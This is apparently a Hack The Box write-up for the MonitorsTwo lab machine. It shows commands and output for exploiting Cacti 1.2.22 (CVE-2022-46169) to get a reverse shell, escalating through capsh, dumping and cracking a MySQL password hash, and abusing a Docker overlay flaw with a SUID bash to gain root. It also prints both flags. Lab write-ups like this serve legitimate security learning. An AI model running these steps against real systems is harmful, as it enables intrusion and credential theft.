---
title: "MonitorsTwo from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# MonitorsTwo from HTB
`nmap`returned this:
```bash
PORT      STATE    SERVICE         VERSION
22/tcp    open     ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp    open     http            nginx 1.18.0 (Ubuntu)
|_http-title: Login to Cacti
|_http-server-header: nginx/1.18.0 (Ubuntu)
```
access the site via `IP`and we find that it's `cacti 1.2.22`version which is exploitable. After searching i found: https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22
```
1. rlwrap nc -nlvp 1234



2.python3 CVE-2022-46169-cacti-1.2.22-exploit.py -u http://10.10.11.211/ --LHOST=10.10.16.5 --LPORT=1234
Checking...
The target is vulnerable. Exploiting...
Bruteforcing the host_id and local_data_ids
Bruteforce Success!!



3.rlwrap nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.11.211] 51012
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@50bca5e748b0:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@50bca5e748b0:/var/www/html$
```
spawn `/bin/bash`
```
script /dev/null -c bash
```
There is an `.dockerenv`file in `/`that means we are in `docker container`. We proceed with our enumeration by searching for files with the `SUID` bit set.
```bash
find / -perm /4000 2>/dev/null
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/sbin/capsh
/bin/mount
/bin/umount
/bin/su
```
`capsh`can be used to become the `root`:
```bash
capsh --gid=0 --uid=0 --
capsh --gid=0 --uid=0 --
root@50bca5e748b0:/var/www/html#
```
in `/`directory there is `entrypoint.sh`which i guess shouldn't be but i used it and got that there is an `mysql database`which can be accessed:
```bash
root@50bca5e748b0:/# cat ent
cat entrypoint.sh
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
```
Then i connected to `mysql`:
```bash
root@50bca5e748b0:/#  mysql --host=db --user=root --password=root cacti
show databases;
...........
MySQL [cacti]> use cacti;
use cacti;
Database changed
MySQL [cacti]> show tables;
show tables;
............
MySQL [cacti]> select * from user_auth;
select * from user_auth;
................
|  4 | marcus   | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C |     0 | Marcus Brune   | marcus@monitorstwo.htb |
```
So there is an user named `marcus`and there is an hashed password. Crack it with `John the ripper`and get the password:
```bash
john -w=/usr/share/wordlists/rockyou.txt hash
........
.........
funkymonkey      (?)
```
Then connect to `ssh`:
```bash
ssh marcus@10.10.11.211
marcus@monitorstwo:~$ cat user.txt
31a9e1718c1fae3c62ed009bc408f4f4
```
***
User Flag is: 31a9e1718c1fae3c62ed009bc408f4f4
***
```bash
marcus@monitorstwo:~$ sudo -l
[sudo] password for marcus:
Sorry, user marcus may not run sudo on localhost.
```
That's bad.
```bash
marcus@monitorstwo:~$ cat /var/mail/marcus
From: administrator@monitorstwo.htb
To: all@monitorstwo.htb
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

Administrator
CISO
Monitor Two
Security Team
```
This is something we will need.
First two is useless for us in this moment.
We'll need third `CVE`:
```
docker --version
Docker version 20.10.5+dfsg1, build 55c4c88
```
This is exploitable.
We can employ `findmnt` to display the mounts connected to the system, including those used by Docker containers.
```
findmnt
TARGET                                SOURCE     FSTYPE     OPTIONS
├─/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
│                                     overlay    overlay    rw,relatime,lowerdir=/var/lib/docker/overlay2/l/756FTPFO4AE7HBWVGI5TXU76FU:/var/lib/docker/overlay2/l/XKE4ZK5GJUT
├─/var/lib/docker/containers/e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69/mounts/shm
│                                     shm        tmpfs      rw,nosuid,nodev,noexec,relatime,size=65536k
├─/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
│                                     overlay    overlay    rw,relatime,lowerdir=/var/lib/docker/overlay2/l/4Z77R4WYM6X4BLW7GXAJOAA4SJ:/var/lib/docker/overlay2/l/Z4RNRWTZKMX
└─/var/lib/docker/containers/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e/mounts/shm
  shm        tmpfs      rw,nosuid,nodev,noexec,relatime,size=65536k
```
In `netcat`connection where we are `root`find which docker is used for `cacti`with `mount`and it is:
```
upperdir=/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/diff,workdir=/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/work,xino=off)
```
So we will have to go to `/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged`So we will be at the same directory as we are in `netcat`.If you create file in that directory you will see it in other terminal too.
With root `in netcat`copy `/bin/bash`to `/`and make it executable by `user`to use it to become the root.
```bash
root@50bca5e748b0:/# cp /bin/bash /
cp /bin/bash /
root@50bca5e748b0:/# chmod u+s /bash
chmod u+s /bash # in netcat
```
Now in `ssh`:
```bash
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ./bash  -p
bash-5.1#
```
We are now `root`.
***
Root Flag is: d37df4d2b25c038065fc5602d0368d7b
****
![](/assets/images/Screenshot from 2024-08-12 18-46-04.png)
